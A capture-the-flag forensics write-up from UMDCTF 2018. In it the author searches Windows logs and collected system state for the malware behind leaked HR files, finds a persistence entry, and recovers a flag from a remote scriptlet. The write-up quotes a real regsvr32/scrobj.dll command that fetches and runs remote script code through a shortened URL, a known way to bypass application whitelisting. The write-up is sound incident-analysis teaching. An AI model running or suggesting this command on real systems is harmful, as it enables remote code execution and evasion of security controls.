@@ -1,0 +1,87 @@
+In this challenge, we're told that a load of HR files were leaked to the internet, and can we investigate and find the malware which was responsible.
+To this end, we're not handed a full disk image, but a suite of logs and tools output. 
+
+seamus@ubuntu:~/CTF/UMDCTF2018/20180414120653-WIN-Q9JPOBVS95D/Evidence$ ls -al
+total 52
+drwxr-xr-x 9 seamus seamus  4096 Apr 14 11:13 .
+drwx------ 3 seamus seamus  4096 Apr 14 11:13 ..
+drwxr-xr-x 2 seamus seamus  4096 Apr 14 11:46 Collected
+drwxr-xr-x 2 seamus seamus  4096 Apr 14 11:20 CVE
+-rw-r--r-- 1 seamus seamus  6148 Apr 14 09:38 .DS_Store
+drwxr-xr-x 7 seamus seamus  4096 Apr 14 11:13 JumpLists
+drwxr-xr-x 2 seamus seamus  4096 Apr 14 11:13 Logs
+drwxr-xr-x 2 seamus seamus 12288 Apr 14 11:13 Prefetch
+drwxr-xr-x 7 seamus seamus  4096 Apr 14 11:13 RecentLNKs
+drwxr-xr-x 3 seamus seamus  4096 Apr 14 11:13 Registry
+
+There's a ton of data here, and we're searching for a needle in a haystack. 
+An obvious place to start is logs.
+
+seamus@ubuntu:~/CTF/UMDCTF2018/20180414120653-WIN-Q9JPOBVS95D/Evidence/Logs$ ls -al
+total 20020
+drwxr-xr-x 2 seamus seamus    4096 Apr 14 11:13 .
+drwxr-xr-x 9 seamus seamus    4096 Apr 14 11:13 ..
+-rwx------ 1 seamus seamus 2166784 Apr 14 08:56 Application.evtx
+-rwx------ 1 seamus seamus    4096 Apr 14 08:55 DebugChannel.etl
+-rwx------ 1 seamus seamus   69632 Dec  6 10:49 HardwareEvents.evtx
+-rwx------ 1 seamus seamus   69632 Dec  6 10:49 Internet Explorer.evtx
+-rwx------ 1 seamus seamus   69632 Dec  6 10:49 Key Management Service.evtx
+-rwx------ 1 seamus seamus   69632 Dec  6 10:49 Media Center.evtx
+-rwx------ 1 seamus seamus    4096 Apr 14 08:55 Microsoft-RMS-MSIPC%4Debug.etl
+-rwx------ 1 seamus seamus   69632 Dec  6 10:49 Microsoft-Windows-Application-Experience%4Problem-Steps-Recorder.evtx
+-rwx------ 1 seamus seamus   69632 Dec  6 10:49 Microsoft-Windows-Application-Experience%4Program-Compatibility-Assistant.evtx
+-rwx------ 1 seamus seamus   69632 Dec  6 10:49 Microsoft-Windows-Application-Experience%4Program-Compatibility-Troubleshooter.evtx
+-rwx------ 1 seamus seamus   69632 Dec  6 10:49 Microsoft-Windows-Application-Experience%4Program-Inventory.evtx
+-rwx------ 1 seamus seamus   69632 Dec  7 18:11 Microsoft-Windows-Application-Experience%4Program-Telemetry.evtx
+-rwx------ 1 seamus seamus 1052672 Apr 13 14:35 Microsoft-Windows-Bits-Client%4Operational.evtx
+-rwx------ 1 seamus seamus   69632 Dec  7 18:11 Microsoft-Windows-BranchCacheSMB%4Operational.evtx
+-rwx------ 1 seamus seamus   69632 Dec  8 07:52 Microsoft-Windows-Dhcp-Client%4Admin.evtx
+-rwx------ 1 seamus seamus   69632 Dec  7 18:11 Microsoft-Windows-Dhcpv6-Client%4Admin.evtx
+-rwx------ 1 seamus seamus   69632 Dec  7 18:11 Microsoft-Windows-Diagnosis-DPS%4Operational.evtx
+-rwx------ 1 seamus seamus   69632 Dec  6 19:01 Microsoft-Windows-Diagnosis-Scheduled%4Operational.evtx
+-rwx------ 1 seamus seamus   69632 Dec  7 18:13 Microsoft-Windows-Diagnostics-Performance%4Operational.evtx
+-rwx------ 1 seamus seamus   69632 Apr 13 14:32 Microsoft-Windows-DiskDiagnosticDataCollector%4Operational.evtx
+-rwx------ 1 seamus seamus   69632 Apr 14 08:47 Microsoft-Windows-Fault-Tolerant-Heap%4Operational.evtx
+--------------------TRUNCATED--------------------------------------------
+
+There's a ton of logs here, but most of them are empty. A log size of 68k is an empty log file. 
+
+There's nothing of incredible interest in the log files, and without a clue of what to look for, we could scroll through sysmon events all day. 
+
+Looking in the Collected folder, there's the details of the state of the systems - prefetch, autoruns, scheduledtasks, running processes, network 
+connections, etc. 
+
+Where's an obvious place to start looking for malware? Autoruns and scheduled tasks are two common places malware will persist. Came up dry in 
+autoruns and persistence, but given that one of the earlier challenges was a wmi challenge, perhaps checking wmistartupinfo will turn something up. 
+
+And sure enough:
+
+Caption=aosidmzvcxkvm
+Command=regsvr32 /s /n /u /i:https://goo.gl/qRpfna scrobj.dll
+Description=aosidmzvcxkvm
+Location=HKU\S-1-5-21-4067685111-2542661885-3946084166-1000\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+SettingID=
+User=WIN-Q9JPOBVS95D\yampelo
+
+This doesn't look legit at all. Scrobj.dll is commonly used to bypass application whitelisting, downloads and runs a remote script. 
+
+Navigating to the url shortened link, it takes us to twitter:
+
+https://twitter.com/umdctffoo1/status/985181748022730752
+
+And the tweet contains the script:
+
+<?XML version="1.0"?>
+<scriptlet>
+<registration 
+    progid="PoC"
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+<!--  License: BSD3-Clause -->
+<script language="JScript">
+[CDATA
+UMDCTF-{c0m-scr4pl3ts-r-cool}
+CDATA]
+
+And there's the flag
+
+
